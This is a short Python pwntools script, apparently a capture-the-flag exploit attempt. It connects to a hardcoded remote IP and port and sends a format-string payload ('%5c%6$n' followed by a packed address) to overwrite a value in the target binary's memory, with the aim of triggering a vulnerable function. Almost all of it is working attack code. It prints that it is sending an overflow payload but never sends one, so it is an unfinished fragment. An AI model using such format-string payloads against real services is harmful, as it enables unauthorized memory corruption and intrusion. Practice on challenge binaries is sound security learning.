from pwn import *
import time

context(arch='i386', os='linux', log_level='debug')

HOST = '39.96.193.120'
PORT = 10000

conn = remote(HOST, PORT)

time.sleep(1)
data = conn.recv(timeout=5)
print(f"\n[1] Initial recv ({len(data)} bytes): {data}")

print("\n[2] Sending short input to vuln()...")
conn.send(b'A\n')
time.sleep(2)

data = conn.recv(timeout=5)
print(f"\n[3] After vuln input ({len(data)} bytes): {data}")

print("\n[4] Sending format string to main's first read()...")
target_val_addr = 0x804c030
fmt_payload = b'%5c%6$na' + p32(target_val_addr)
conn.send(fmt_payload)
time.sleep(1)

print("\n[5] Sending dummy to main's second read()...")
conn.send(b'B\n')
time.sleep(2)

data = conn.recv(timeout=5)
print(f"\n[6] After format string ({len(data)} bytes): {data}")

if b'Input' in data:
    print("\n[7] vuln triggered! Sending overflow payload...")
else:
    print("\n[7] vuln NOT triggered, trying to receive more...")
    data2 = conn.recv(timeout=5)
    print(f"More data: {data2}")
    if b'Input' in data2:
        print("vuln triggered now!")

conn.close()
